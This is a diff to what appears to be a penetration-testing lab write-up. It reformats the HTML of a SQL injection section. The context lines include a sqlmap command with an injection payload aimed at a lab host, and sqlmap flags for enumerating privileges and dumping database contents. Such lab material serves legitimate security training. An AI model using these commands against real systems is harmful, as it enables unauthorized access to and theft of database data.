@@ -903,12 +903,14 @@ sqlmap -u 'http://web.academy.ninja.lan/Students?SearchString=charlie%2522&order
 
 <p>Databases found:</p>
 
-<p>Master
-Model
-msdb
-tempdb</p>
+<ul>
+<li>Master</li>
+<li>Model</li>
+<li>msdb</li>
+<li>tempdb</li>
+</ul>
 
-<p>Internal MSSQL Enumeration</p>
+<h4>Internal MSSQL Enumeration</h4>
 
 <pre><code>--current-user #Get current user
 --is-dba #Check if current user is Admin
@@ -918,7 +920,7 @@ tempdb</p>
 --privileges #Get privileges
 </code></pre>
 
-<p>DB Data enumeration</p>
+<h4>DB Data enumeration</h4>
 
 <pre><code>--all #Retrieve everything
 --dump #Dump DBMS database table entries
